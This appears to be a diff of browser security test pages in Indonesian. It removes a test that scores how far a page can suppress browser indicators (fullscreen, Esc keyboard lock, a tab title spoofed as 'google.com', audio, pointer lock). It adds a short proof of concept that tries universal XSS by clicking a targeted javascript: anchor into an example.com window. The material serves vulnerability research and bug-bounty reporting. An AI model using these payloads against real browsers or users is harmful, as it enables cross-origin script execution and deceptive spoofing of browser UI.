@@ -1,109 +1,14 @@
-<!-- MEKANISME: ANGGARAN NOTICE — berapa banyak kanal indikator browser yang bisa dikuasai halaman dalam satu gestur; keluarannya sebuah SKOR yang dihitung dari status API, bukan klaim, dan tidak ada chrome palsu yang digambar. -->
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>29 — Anggaran notice: hitung indikator yang tertekan</title>
-<style>
-body{font:15px/1.55 system-ui,"Segoe UI",sans-serif;margin:0;padding:1rem;color:#111;background:#fff;overscroll-behavior:auto}
-h2{font-size:1.05rem;margin:.2rem auto .8rem;max-width:760px}
-.box{border:2px solid #d33;border-radius:10px;padding:.8rem;max-width:760px;margin:0 auto 1rem}
-.kv{display:grid;grid-template-columns:11rem 1fr;gap:.2rem .6rem;font-size:.9rem}
-.kv b{color:#555;font-weight:600}
-.real{color:#0a7;word-break:break-all;font-family:ui-monospace,Consolas,monospace}
-button{font:inherit;padding:.45rem .8rem;border:1px solid #888;border-radius:8px;background:#fafafa;cursor:pointer;margin:.15rem}
-pre{background:#f4f4f4;border-radius:8px;padding:.6rem;white-space:pre-wrap;word-break:break-word;font-size:.9rem;max-width:760px;margin:.6rem auto}
-#out{font-size:1rem;font-weight:600}
-.oracle{max-width:760px;margin:1rem auto;font-size:.86rem;border-top:1px dashed #999;padding-top:.6rem}
-.v{color:#c00;font-weight:700}.s{color:#080;font-weight:700}
-.acts{max-width:760px;margin:0 auto}
-code{background:#eee;padding:.05rem .25rem;border-radius:4px}
-@media(prefers-color-scheme:dark){body{background:#161616;color:#eee}.kv b{color:#aaa}pre{background:#242424}code{background:#2b2b2b}}
-</style>
-</head>
-<body>
-
-<h2>29 — Anggaran notice: berapa indikator yang bisa ditekan sekaligus?</h2>
-
-<div class="box">
-  <div class="kv">
-    <b>URL nyata halaman ini</b><span class="real" id="here">…</span>
-    <b>Origin nyata</b><span class="real" id="top">…</span>
-    <b>Keluaran</b><span>Sebuah <b>angka</b>: berapa kanal indikator yang berhasil dikuasai, diukur dari status API
-      (<code>fullscreenElement</code>, promise keyboard-lock, <code>pointerLockElement</code>,
-      <code>AudioContext.state</code>), bukan dari klaim.</span>
-    <b>Keselamatan</b><span>Semua kanal <b>otomatis dilepas setelah 12 detik</b>; tekan <b>Esc</b> atau tombol
-      “Lepaskan semua” kapan saja. Berkas ini tidak menggambar satu piksel pun chrome palsu.</span>
-  </div>
-</div>
-
-<div class="acts">
-  <button id="run">Jalankan anggaran penuh (butuh klik = gestur)</button>
-  <button id="ctrl">Lengan KONTROL: tanpa fullscreen</button>
-  <button id="rel">Lepaskan semua</button>
-</div>
-
-<pre id="out">SKOR SUPRESI: — / 6   (belum dijalankan)</pre>
-
-<div class="oracle">
-  <p><span class="v">VULNERABLE bila:</span> skornya tinggi <b>dan</b> pada potret layar tidak ada satu pun permukaan
-  milik browser yang tersisa — tidak ada notice fullscreen yang menyebut origin, tidak ada ikon audio pada tab, tidak
-  ada petunjuk jalan keluar. Laporkan angkanya beserta kanal mana yang berhasil, bukan “saya bisa menggambar bar palsu”.</p>
-  <p><span class="s">SECURE bila:</span> setiap kanal yang berhasil tetap disertai indikator browser yang terlihat dan
-  bertahan cukup lama untuk dibaca — mis. notice fullscreen menyebut origin di panel atas, ikon audio tab menyala,
-  dan Esc tetap keluar.</p>
-  <p><b>Baseline aman (lengan kontrol):</b> tombol kedua menjalankan probe yang sama dengan fullscreen dihapus.
-  Karena chrome tetap terlihat, skornya harus turun dan seluruh permukaan origin browser tetap ada.
-  Bandingkan kedua angka pada browser dan versi yang sama.</p>
-  <p><b>Catatan pengukuran:</b> halaman tidak bisa melihat apakah notice benar-benar terlukis. Angka ini mengukur
-  <i>kanal yang dikuasai</i>; pembacaan “notice tidak pernah muncul” berasal dari potret layar/rekaman kamu, dan wajib
-  dibandingkan dengan halaman fullscreen polos pada browser yang sama.</p>
-</div>
-
+<!-- 44 - javascript: lewat klik anchor ber-target   [UXSS / SOP bypass | macOS: Dia/Arc/Safari macOS]
+     MEKANISME : satu delta dari 37: penyampai bukan penugasan location melainkan klik anchor - jalur parser berbeda.
+     PREDIKAT  : skrip berjalan di dalam origin korban.
+     AMAN      : pembacaan lintas-origin dilempar SecurityError; baris bukti berkata DIBLOKIR.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>44 javascript: lewat klik anchor ber-target</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var out=document.getElementById('out'),T=6,score=0,chan=[],icon=null,ctx=null,timer=null;
-var oldTitle=document.title,wheel=function(e){e.preventDefault();};
-function render(){out.textContent='SKOR SUPRESI: '+score+' / '+T+'\n\n'+chan.join('\n');}
-function mark(n,ok,note){chan.push((ok?'[X] ':'[ ] ')+n+(note?'  — '+note:''));if(ok)score++;render();}
-function run(useFs){
-  release(true);score=0;chan=[];render();
-  if(useFs&&document.documentElement.requestFullscreen){
-    document.documentElement.requestFullscreen().then(function(){mark('fullscreen aktif (notice S9 = sisa chrome satu-satunya)',!!document.fullscreenElement);rest();},
-      function(e){mark('fullscreen aktif',false,e.name);rest();});
-  }else{mark('fullscreen aktif',false,useFs?'tidak didukung di browser ini':'DIHAPUS (lengan kontrol)');rest();}
-}
-function rest(){
-  if(navigator.keyboard&&navigator.keyboard.lock)navigator.keyboard.lock(['Escape']).then(function(){mark('Esc dikunci (keyboard lock)',true,'jalan keluar direbut halaman');},function(e){mark('Esc dikunci (keyboard lock)',false,e.name);});
-  else mark('Esc dikunci (keyboard lock)',false,'tidak didukung di browser ini');
-  document.title='google.com';icon=document.createElement('link');icon.rel='icon';
-  icon.href='data:image/svg+xml,'+encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><rect width="16" height="16" fill="#c00"/></svg>');
-  document.head.appendChild(icon);mark('identitas tab (judul+favicon) dikuasai halaman',true,'judul kini label "google.com" — label, bukan origin');
-  try{var A=window.AudioContext||window.webkitAudioContext;if(!A)throw new Error('n/a');
-    ctx=new A();var g=ctx.createGain();g.gain.value=0.0001;var o=ctx.createOscillator();o.connect(g);g.connect(ctx.destination);o.start();
-    mark('kanal audio dipegang (nyaris tanpa bunyi)',ctx.state==='running','amati: apakah ikon audio tab menyala?');}
-  catch(e){mark('kanal audio dipegang',false,'tidak didukung di browser ini');}
-  document.documentElement.style.overscrollBehavior='none';window.addEventListener('wheel',wheel,{passive:false});
-  mark('scroll dijail (bar URL mobile tak dipanggil kembali)',true);
-  try{if(document.body.requestPointerLock){document.body.requestPointerLock();setTimeout(function(){mark('pointer-lock (tabrakan notice, pola CVE-2021-43538)',!!document.pointerLockElement);},400);}
-      else mark('pointer-lock',false,'tidak didukung di browser ini');}catch(e){mark('pointer-lock',false,e.name);}
-  timer=setTimeout(function(){release();},12000);
-}
-function release(quiet){
-  if(timer){clearTimeout(timer);timer=null;}
-  try{if(document.exitFullscreen&&document.fullscreenElement)document.exitFullscreen();}catch(e){}
-  try{if(navigator.keyboard&&navigator.keyboard.unlock)navigator.keyboard.unlock();}catch(e){}
-  try{if(document.exitPointerLock)document.exitPointerLock();}catch(e){}
-  window.removeEventListener('wheel',wheel,{passive:false});
-  document.documentElement.style.overscrollBehavior='';document.title=oldTitle;
-  if(icon&&icon.parentNode){icon.parentNode.removeChild(icon);}icon=null;
-  try{if(ctx)ctx.close();}catch(e){}ctx=null;
-  if(!quiet){chan.push('--- semua kanal DILEPAS ---');render();}
-}
-document.getElementById('here').textContent=location.href;document.getElementById('top').textContent=location.origin||'null (file://)';
-document.getElementById('run').onclick=function(){run(true);};document.getElementById('ctrl').onclick=function(){run(false);};
-document.getElementById('rel').onclick=function(){release();};
-window.addEventListener('keydown',function(e){if(e.key==='Escape')release();});
+o.textContent='REAL: '+location.origin;
+function go(){var w=window.open('https://example.com/','x');setTimeout(function(){var a=document.createElement('a');a.href='javascript:window.opener.o.textContent="BISA BACA -> UXSS: "+location.origin';a.target='x';document.body.appendChild(a);a.click();setTimeout(function(){if(!/UXSS/.test(o.textContent))o.textContent='DIBLOKIR (aman)';},1200);},2200);}
 </script>
-</body>
-</html>
